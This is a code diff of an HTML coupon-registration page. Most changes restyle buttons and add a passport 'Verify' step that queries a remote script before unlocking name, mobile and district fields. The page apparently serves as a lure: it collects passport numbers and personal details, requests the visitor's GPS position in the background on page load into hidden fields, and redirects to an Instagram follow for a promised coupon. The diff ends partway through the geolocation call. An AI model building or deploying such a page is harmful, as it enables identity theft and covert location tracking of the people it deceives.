@@ -9,7 +9,7 @@
     <style>
         :root {
             --primary-color: #EE1C25; 
-            --primary-hover: #cc0000;
+            --primary-hover: #D01019;
             --bg-color: #f4f7f6;
             --text-color: #333;
             --border-radius: 12px;
@@ -73,8 +73,44 @@
             cursor: not-allowed; opacity: 0.8;
         }
 
-        /* PRIMARY BUTTON (Form Submit) */
-        button {
+        /* --- MODERN VERIFY ROW --- */
+        .verify-row {
+            display: flex;
+            gap: 12px; /* Space between input and button */
+        }
+        
+        /* NEW VERIFY BUTTON STYLE */
+        .verify-btn {
+            background-color: white;
+            color: var(--primary-color);
+            border: 2px solid var(--primary-color);
+            padding: 0 24px;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 600;
+            font-size: 14px;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+            margin-top: 0; /* Align with input */
+            box-shadow: 0 4px 10px rgba(238, 28, 37, 0.1);
+        }
+
+        .verify-btn:hover {
+            background-color: var(--primary-color);
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(238, 28, 37, 0.25);
+        }
+        
+        .verify-btn:active {
+            transform: translateY(0);
+        }
+
+        /* PRIMARY SUBMIT BUTTON */
+        .submit-btn {
             width: 100%; background-color: var(--primary-color); color: white;
             padding: 16px; border: none; border-radius: var(--border-radius);
             font-size: 16px; font-weight: 600; cursor: pointer;
@@ -82,19 +118,15 @@
             margin-top: 10px;
         }
 
-        button:hover {
+        .submit-btn:hover {
             background-color: var(--primary-hover); transform: translateY(-2px);
             box-shadow: 0 15px 30px rgba(238, 28, 37, 0.3);
         }
         
-        button:disabled {
+        .submit-btn:disabled {
             background-color: #dcdde1; box-shadow: none; cursor: not-allowed;
             transform: none; color: #95a5a6;
         }
-
-        /* HIDDEN LOCATION BADGE */
-        .location-badge { display: none; }
-        .dot { height: 8px; width: 8px; background-color: #00b894; border-radius: 50%; }
 
         /* OVERLAY & POPUP */
         .overlay {
@@ -117,18 +149,13 @@
         .popup h3 { margin: 0 0 15px 0; color: #2d3436; font-size: 20px; }
         .popup p { color: #636e72; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
         
-        /* SECONDARY BUTTON (Instagram Redirect) */
         .popup-btn {
             background: #2d3436; margin-top: 15px; font-size: 14px; padding: 12px;
             color: white; width: 100%; border: none; border-radius: var(--border-radius);
             cursor: pointer; transition: background 0.3s;
         }
         .popup-btn:hover { background: #000; }
-        
-        /* Disabled State for Insta Button */
-        .popup-btn:disabled {
-            background: #ccc; cursor: not-allowed; color: #888;
-        }
+        .popup-btn:disabled { background: #ccc; cursor: not-allowed; color: #888; }
 
         .timer-text {
             font-weight: 600; color: var(--primary-color); display: block; margin-top: 5px; font-size: 14px;
@@ -145,15 +172,13 @@
     <div id="popup" class="popup">
         <h3 id="popupTitle">Message</h3>
         <p id="popupText">Details</p>
-        <button onclick="closePopup()">Continue</button>
+        <button class="popup-btn" onclick="closePopup()">Continue</button>
     </div>
 
     <div id="redirectPopup" class="popup">
         <h3 style="color: var(--primary-color);">Almost Done!</h3>
         <p>Follow our Instagram page to receive your coupon code; once you follow us, we will send your Coupon code! Thanks!</p>
-        
         <span id="countdown" class="timer-text">Wait 5s...</span>
-        
         <button id="instaBtn" class="popup-btn" onclick="goToInsta()" disabled>Please Wait...</button>
     </div>
 </div>
@@ -165,13 +190,17 @@
 
     <h2>Coupon Registration</h2>
     
-    <div class="location-badge" id="locBadge"><span class="dot" id="locDot"></span><span id="locText"></span></div>
+    <div style="display:none"><span id="locText"></span></div>
 
     <form id="collectionForm">
         <div class="form-group">
             <label>Passport Number</label>
-            <input type="text" id="passport" placeholder="Enter ID to Verify..." autocomplete="off" required>
+            <div class="verify-row">
+                <input type="text" id="passport" placeholder="Enter ID..." autocomplete="off" required>
+                <button type="button" class="verify-btn" onclick="checkPassport()">Verify</button>
+            </div>
         </div>
+
         <div class="form-group">
             <label>Full Name</label>
             <input type="text" id="fullName" placeholder="Locked" disabled>
@@ -185,7 +214,8 @@
             <input type="text" id="district" placeholder="Locked" disabled>
         </div>
         <input type="hidden" id="lat"><input type="hidden" id="long">
-        <button type="submit" id="submitBtn" disabled>Submit</button>
+        
+        <button type="submit" id="submitBtn" class="submit-btn" disabled>Submit</button>
     </form>
 </div>
 
@@ -210,10 +240,12 @@
     const districtInput = document.getElementById('district');
     const submitBtn = document.getElementById('submitBtn');
 
-    // --- 1. PASSPORT VALIDATION ---
-    passportInput.addEventListener('change', function() {
-        const val = this.value.trim();
-        if(val.length < 2) return;
+    function checkPassport() {
+        const val = passportInput.value.trim();
+        if(val.length < 2) {
+            showPopup("Input Error", "Please enter a valid Passport Number.");
+            return;
+        }
         
         showLoader();
         fetch(`${scriptURL}?q=${encodeURIComponent(val)}`)
@@ -230,11 +262,10 @@
         })
         .catch(() => {
             hideLoader();
-            showPopup("Error", "Please check internet connection.");
+            showPopup("Error", "Connection failed. Please check internet.");
         });
-    });
+    }
 
-    // --- 2. SUBMISSION & REDIRECT ---
     document.getElementById('collectionForm').addEventListener('submit', e => {
         e.preventDefault();
         showLoader();
@@ -254,7 +285,7 @@
             body: JSON.stringify(body)
         }).then(() => {
             hideLoader();
-            startRedirectSequence(); // Trigger the manual flow
+            startRedirectSequence(); 
             lockForm();
         }).catch(() => {
             hideLoader();
@@ -262,13 +293,11 @@
         });
     });
 
-    // --- 3. TIMER & BUTTON LOGIC ---
     function startRedirectSequence() {
         overlay.style.display = 'flex';
         popup.style.display = 'none';
         redirectPopup.style.display = 'block';
         
-        // Reset Button State
         instaBtn.disabled = true;
         instaBtn.innerText = "Please Wait...";
         
@@ -281,9 +310,8 @@
                 countdownSpan.innerText = `Button unlocks in ${secondsLeft}s...`;
             } else {
                 clearInterval(timer);
-                // ENABLE BUTTON
                 countdownSpan.innerText = "Ready!";
-                countdownSpan.style.color = "#27ae60"; // Green
+                countdownSpan.style.color = "#27ae60"; 
                 instaBtn.disabled = false;
                 instaBtn.innerText = "Get Coupon Code (Follow Us)";
             }
@@ -294,13 +322,11 @@
         window.location.href = instaURL;
     }
 
-    // --- 4. UI HELPERS ---
     function showLoader() {
         overlay.style.display = 'flex';
         loader.style.display = 'block';
         popup.style.display = 'none';
         redirectPopup.style.display = 'none';
-        passportInput.blur();
     }
     
     function hideLoader() { loader.style.display = 'none'; }
@@ -321,7 +347,6 @@
         mobileInput.disabled = false;
         districtInput.disabled = false;
         submitBtn.disabled = false;
-        mobileInput.focus();
     }
 
     function lockForm() {
@@ -333,7 +358,6 @@
         passportInput.value = "";
     }
 
-    // --- 5. GPS (Background) ---
     window.onload = function() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
